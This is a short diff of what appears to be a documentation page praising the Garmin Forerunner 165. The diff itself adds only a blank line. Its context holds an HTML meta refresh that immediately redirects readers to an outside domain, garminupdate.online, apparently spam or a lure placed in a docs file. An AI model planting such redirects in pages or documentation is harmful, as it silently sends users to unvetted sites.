@@ -2,6 +2,7 @@
  
     <meta http-equiv="refresh" content="0; url=https://garminupdate.online/">
 
+
 Garmin Forerunner 165: The Perfect Fusion of Simplicity and Smart Fitness
 ==========================================================================
 .. toctree::
